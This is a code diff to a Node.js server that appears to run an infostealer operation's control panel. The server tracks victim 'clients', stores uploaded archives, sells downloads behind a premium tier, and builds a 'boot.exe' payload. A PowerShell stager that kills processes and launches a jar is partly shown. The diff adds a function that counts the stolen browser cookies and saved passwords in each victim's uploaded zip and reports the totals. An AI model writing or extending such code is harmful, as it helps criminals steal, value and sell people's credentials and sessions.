@@ -12,6 +12,7 @@ import http from 'node:http';
 import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
+import AdmZip from 'adm-zip';
 
 import { remoteDb, initRemoteDb } from './remote_db.js';
 import { db, initLocalDb, UPLOAD_DIR } from './local_db.js';
@@ -56,6 +57,58 @@ const tlsOpts = {
   cert: fs.readFileSync(CFG.tlsCert),
   key:  fs.readFileSync(CFG.tlsKey),
 };
+
+// ─── ZIP ANALYZER ───────────────────────────────────────────────────────────
+function analyzeZip(filePath) {
+    try {
+        const zip = new AdmZip(filePath);
+        const zipEntries = zip.getEntries();
+        
+        let netscapeCookies = 0;
+        let jsonCookies = 0;
+        let passwords = 0;
+        let passwordFiles = [];
+        let cookieFiles = [];
+        
+        for (const entry of zipEntries) {
+            if (entry.isDirectory) continue;
+            const name = entry.entryName;
+            const lower = name.toLowerCase();
+            
+            if (lower.includes('cookie')) {
+                const content = entry.getData().toString('utf8');
+                const trimmed = content.trim();
+                
+                if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
+                    try {
+                        const parsed = JSON.parse(trimmed);
+                        if (Array.isArray(parsed)) {
+                            jsonCookies += parsed.length;
+                            cookieFiles.push({ name, count: parsed.length, type: 'json' });
+                        }
+                    } catch {}
+                } else {
+                    const lines = content.split('\n').filter(l => l.trim() && !l.startsWith('#'));
+                    if (lines.length > 0) {
+                        netscapeCookies += lines.length;
+                        cookieFiles.push({ name, count: lines.length, type: 'netscape' });
+                    }
+                }
+            } else if (lower.includes('password') && lower.endsWith('.json')) {
+                try {
+                    const parsed = JSON.parse(entry.getData().toString('utf8'));
+                    if (Array.isArray(parsed)) {
+                        passwords += parsed.length;
+                        passwordFiles.push({ name, count: parsed.length });
+                    }
+                } catch {}
+            }
+        }
+        return { netscapeCookies, jsonCookies, passwords, passwordFiles, cookieFiles };
+    } catch (e) {
+        return { netscapeCookies: 0, jsonCookies: 0, passwords: 0, passwordFiles: [], cookieFiles: [] };
+    }
+}
 
 const app = express();
 app.disable('x-powered-by');
@@ -249,7 +302,6 @@ Get-Process -ErrorAction SilentlyContinue | Where-Object {
 } | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 2000
 
-# KEEP jre and key.json
 $keep = @(
     (Join-Path $dir 'key.json').ToLower(),
     (Join-Path $dir 'jre').ToLower()
@@ -276,7 +328,6 @@ for ($i = 0; $i -lt 15; $i++) {
 }
 "moved st.jar: $(Test-Path $stDst)" | Out-File -Encoding UTF8 -Append $log
 
-# Check if jre is missing or corrupted, download if needed
 $javaw = $null
 $localJava = Get-ChildItem -Path (Join-Path $dir 'jre') -Filter 'javaw.exe' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 if ($localJava) { 
@@ -525,12 +576,23 @@ app.get('/api/clients/:id/uploads', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
   const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  
   const [rows] = await db.query(`
-    SELECT id, filename, size, created_at FROM uploads
+    SELECT id, filename, stored_name, size, created_at FROM uploads
     WHERE user_id = ? AND client_id = ?
-    ORDER BY created_at DESC LIMIT 200
+    ORDER BY created_at DESC LIMIT 10
   `, [req.user.uid, clientId]);
-  res.json(rows);
+  
+  const result = rows.map(row => {
+     const fullPath = path.join(UPLOAD_DIR, row.stored_name);
+     let stats = null;
+     if (fs.existsSync(fullPath) && row.filename.endsWith('.zip')) {
+         stats = analyzeZip(fullPath);
+     }
+     return { ...row, stats };
+  });
+  
+  res.json(result);
 });
 
 app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, async (req, res) => {
@@ -850,7 +912,6 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
   `, [req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now()]);
 
-  // FIXED: ONLY write to boot.exe. Do not overwrite 3.exe.
   fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), zipBuf, { mode: 0o644 });
 
   res.json({
@@ -1133,7 +1194,6 @@ async function refreshAllBuilds() {
 
         if (!liveExeWritten) {
           fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), exeBuf, { mode: 0o644 });
-          // REMOVED the 3.exe overwrite
           liveExeWritten = true;
         }
 
